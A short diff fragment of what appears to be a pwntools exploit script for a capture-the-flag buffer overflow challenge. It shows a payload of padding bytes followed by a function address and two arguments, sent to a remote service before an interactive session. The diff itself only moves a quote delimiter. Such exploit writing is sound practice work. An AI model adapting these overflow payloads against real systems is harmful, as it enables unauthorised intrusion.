@@ -12,8 +12,8 @@ payload = b'a'*188 + p32(flag) + b'a'*4 + p32(parm1) + p32(parm2)
 p = remote(host[0], int(host[1]))
 p.sendline(payload)
 p.interactive()
-"""
 
+"""
 from pwn import *
 
 flag = 0x080491e2
